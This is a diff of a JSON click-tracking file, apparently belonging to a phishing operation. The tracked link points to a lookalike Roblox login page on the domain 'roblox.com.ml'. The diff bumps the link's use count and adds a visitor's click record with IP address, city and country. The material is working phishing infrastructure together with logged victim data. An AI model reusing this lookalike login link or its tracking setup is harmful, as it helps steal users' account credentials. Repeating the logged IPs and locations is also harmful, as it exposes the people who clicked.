@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 514,
+    "useCount": 515,
     "createdBy": "admin",
     "clicks": [
       {
@@ -4219,6 +4219,14 @@
       },
       {
         "timestamp": 1777087570715,
+        "ip": "171.225.202.241",
+        "country": "Vietnam",
+        "city": "Haiphong",
+        "flag": "🇻🇳",
+        "countryCode": "VN"
+      },
+      {
+        "timestamp": 1777087576360,
         "ip": "171.225.202.241",
         "country": "Vietnam",
         "city": "Haiphong",
